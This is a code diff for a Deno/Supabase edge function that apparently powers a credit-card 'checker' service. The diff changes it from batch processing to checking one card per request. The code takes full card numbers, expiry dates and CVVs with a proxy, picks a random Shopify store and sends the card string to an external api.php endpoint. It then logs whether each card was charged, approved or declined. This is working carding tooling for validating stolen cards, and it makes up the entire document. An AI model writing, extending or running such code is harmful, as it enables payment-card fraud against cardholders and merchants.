@@ -6,7 +6,7 @@ const corsHeaders = {
     "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
 };
 
-/* ── Main handler ── */
+/* ── Single-card checker ── */
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
 
@@ -24,141 +24,108 @@ Deno.serve(async (req) => {
     }
 
     const body = await req.json();
-    const { job_id, cards, proxies } = body as {
+    const { job_id, card, proxy } = body as {
       job_id: string;
-      cards: { card: string; expiry: string; cvv: string }[];
-      proxies: string[];
+      card: { card: string; expiry: string; cvv: string };
+      proxy: string;
     };
 
-    if (!job_id || !cards?.length || !proxies?.length) {
-      return new Response(JSON.stringify({ error: "Missing required fields: job_id, cards, proxies" }), {
+    if (!job_id || !card || !proxy) {
+      return new Response(JSON.stringify({ error: "Missing required fields: job_id, card, proxy" }), {
         status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
     }
 
-    // Fetch sites from DB (owner-managed)
-    const { data: siteRows, error: sitesErr } = await supabase
-      .from("shopify_sites")
-      .select("url");
-
-    if (sitesErr || !siteRows?.length) {
-      return new Response(JSON.stringify({ error: "No Shopify sites configured. Ask an owner to add sites." }), {
-        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
+    // Check if job was stopped
+    const { data: jobCheck } = await supabase.from("check_jobs").select("status").eq("id", job_id).single();
+    if (jobCheck?.status === "stopped") {
+      return new Response(JSON.stringify({ status: "stopped" }), {
+        headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
     }
 
-    const sites = siteRows.map((r: any) => r.url);
+    // Fetch a site from DB
+    const { data: siteRows } = await supabase.from("shopify_sites").select("url");
+    if (!siteRows?.length) {
+      return new Response(JSON.stringify({ error: "No Shopify sites configured." }), {
+        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
+      });
+    }
+    // Pick random site
+    const site = siteRows[Math.floor(Math.random() * siteRows.length)].url;
 
-    // Update job to running
-    await supabase.from("check_jobs").update({ status: "running" }).eq("id", job_id);
+    // Update result to checking
+    await supabase.from("check_results")
+      .update({ status: "checking", site_used: site })
+      .eq("job_id", job_id)
+      .eq("card_number", card.card)
+      .eq("expiry", card.expiry)
+      .eq("cvv", card.cvv);
 
-    // Process cards in background
-    const processCards = async () => {
-      let processed = 0, charged = 0, approved = 0, declined = 0;
+    // Build CC string
+    const parts = card.expiry.split("/");
+    const ccStr = `${card.card}|${parts[0] || ""}|${parts[1] || ""}|${card.cvv}`;
 
-      for (let i = 0; i < cards.length; i++) {
-        // Check if job was stopped
-        const { data: jobCheck } = await supabase.from("check_jobs").select("status").eq("id", job_id).single();
-        if (jobCheck?.status === "stopped") break;
+    // Call external checker
+    let result = { status: "declined", code: "ERROR", message: "Unknown error" };
+    try {
+      const apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
+      const resp = await fetch(apiUrl, { method: "GET" });
+      const text = await resp.text();
+      console.log(`Card response:`, text);
 
-        const c = cards[i];
-        const siteIndex = Math.floor(i / 10) % sites.length;
-        const site = sites[siteIndex];
-        const proxy = proxies[i % proxies.length];
-
-        // Update result to checking
-        await supabase.from("check_results")
-          .update({ status: "checking", site_used: site })
-          .eq("job_id", job_id)
-          .eq("card_number", c.card)
-          .eq("expiry", c.expiry)
-          .eq("cvv", c.cvv);
-
-        // Build CC string: card|month|year|cvv
-        const parts = c.expiry.split("/");
-        const mon = parts[0] || "";
-        const yr = parts[1] || "";
-        const ccStr = `${c.card}|${mon}|${yr}|${c.cvv}`;
-
-        // Parse proxy: host:port:user:pass -> http://user:pass@host:port
-        const proxyParts = proxy.split(":");
-        let proxyUrl = proxy;
-        if (proxyParts.length === 4) {
-          proxyUrl = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+      try {
+        const json = JSON.parse(text);
+        result = {
+          status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
+          code: json.code || json.response_code || json.gateway_code || "",
+          message: json.message || json.response || json.msg || text.slice(0, 200),
+        };
+      } catch {
+        const lowerText = text.toLowerCase();
+        if (lowerText.includes("charged") || lowerText.includes("charge of")) {
+          const amountMatch = text.match(/\$[\d.]+/);
+          result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
+        } else if (lowerText.includes("approved") || lowerText.includes("success")) {
+          result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
+        } else {
+          result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
         }
-
-        // Call external Shopify checker endpoint
-        let result = { status: "declined", code: "ERROR", message: "Unknown error" };
-        try {
-          const apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxyUrl)}`;
-          const resp = await fetch(apiUrl, { method: "GET" });
-          const text = await resp.text();
-          console.log(`Card ${i+1} response:`, text);
-
-          // Parse response - try JSON first, then text patterns
-          try {
-            const json = JSON.parse(text);
-            result = {
-              status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
-              code: json.code || json.response_code || json.gateway_code || "",
-              message: json.message || json.response || json.msg || text.slice(0, 200),
-            };
-          } catch {
-            // Parse text response patterns
-            const lowerText = text.toLowerCase();
-            if (lowerText.includes("charged") || lowerText.includes("charge of")) {
-              // Extract amount if present (e.g. "Charged $1.00" or "charge of $0.50")
-              const amountMatch = text.match(/\$[\d.]+/);
-              result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
-            } else if (lowerText.includes("approved") || lowerText.includes("success")) {
-              result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
-            } else {
-              result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
-            }
-          }
-        } catch (fetchErr: any) {
-          console.error(`Card ${i+1} fetch error:`, fetchErr.message);
-          result = { status: "declined", code: "FETCH_ERROR", message: fetchErr.message };
-        }
-
-        // Update result
-        if (result.status === "charged") charged++;
-        else if (result.status === "approved") approved++;
-        else declined++;
-        processed++;
-
-        await supabase.from("check_results")
-          .update({
-            status: result.status,
-            response_code: result.code,
-            response_message: result.message,
-            site_used: site,
-          })
-          .eq("job_id", job_id)
-          .eq("card_number", c.card)
-          .eq("expiry", c.expiry)
-          .eq("cvv", c.cvv);
-
-        // Update job progress
-        await supabase.from("check_jobs").update({ processed, charged, approved, declined }).eq("id", job_id);
-
-        // Small delay between cards
-        await new Promise((r) => setTimeout(r, 500 + Math.random() * 500));
       }
+    } catch (fetchErr: any) {
+      console.error(`Fetch error:`, fetchErr.message);
+      result = { status: "declined", code: "FETCH_ERROR", message: fetchErr.message };
+    }
 
-      // Mark job complete
+    // Update result in DB
+    await supabase.from("check_results")
+      .update({
+        status: result.status,
+        response_code: result.code,
+        response_message: result.message,
+        site_used: site,
+      })
+      .eq("job_id", job_id)
+      .eq("card_number", card.card)
+      .eq("expiry", card.expiry)
+      .eq("cvv", card.cvv);
+
+    // Update job counters
+    const { data: jobData } = await supabase.from("check_jobs").select("processed, charged, approved, declined, total_cards").eq("id", job_id).single();
+    if (jobData) {
+      const processed = (jobData.processed || 0) + 1;
+      const charged = (jobData.charged || 0) + (result.status === "charged" ? 1 : 0);
+      const approved = (jobData.approved || 0) + (result.status === "approved" ? 1 : 0);
+      const declined = (jobData.declined || 0) + (result.status === "declined" ? 1 : 0);
+      const isComplete = processed >= jobData.total_cards;
+
       await supabase.from("check_jobs").update({
-        status: "completed", processed, charged, approved, declined, completed_at: new Date().toISOString(),
+        processed, charged, approved, declined,
+        ...(isComplete ? { status: "completed", completed_at: new Date().toISOString() } : {}),
       }).eq("id", job_id);
-    };
+    }
 
-    // Fire and forget
-    processCards().catch(async (err) => {
-      console.error("Job failed:", err);
-      await supabase.from("check_jobs").update({ status: "failed" }).eq("id", job_id);
-    });
-
-    return new Response(JSON.stringify({ success: true, job_id }), {
+    return new Response(JSON.stringify({ success: true, result }), {
       headers: { ...corsHeaders, "Content-Type": "application/json" },
     });
   } catch (err: any) {
